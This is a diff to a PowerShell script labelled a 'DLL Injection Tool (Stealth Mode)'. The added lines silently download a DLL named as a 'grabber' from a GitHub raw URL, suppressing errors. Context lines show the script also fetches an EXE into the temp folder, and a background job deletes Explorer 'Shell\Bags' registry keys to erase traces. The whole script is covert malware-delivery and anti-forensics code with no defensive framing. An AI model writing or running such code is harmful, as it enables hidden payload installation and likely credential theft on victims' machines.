@@ -2,7 +2,23 @@
 # DLL Injection Tool (Stealth Mode)
 # ================================
 
-# STEP 1: Define GitHub URL & Temp EXE Path
+# STEP 0: Download DLL before anything else
+$dllUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/badmos-g*abber.dll"
+$dllPath = "D:\virtualbox\KaliLinux\Logs\badmos-g*abber.dll"
+
+# Create directory if it doesn't exist
+$dir = Split-Path $dllPath
+if (-not (Test-Path $dir)) {
+    New-Item -Path $dir -ItemType Directory -Force | Out-Null
+}
+
+# Download the DLL
+Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
+
+# Wait for 2 seconds
+Start-Sleep -Seconds 2
+
+# STEP 1: Define GitHub EXE URL & Temp Path
 $exeUrl = "https://raw.githubusercontent.com/Mohit-Parihar-112/manualmappfucker-projecct/refs/heads/main/audio.dg.exe"
 $tempPath = "$env:TEMP\ConsoleApplication6.exe"
 
@@ -43,3 +59,4 @@ Start-Job -ScriptBlock {
         Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
     } catch {}
 } | Out-Null
+
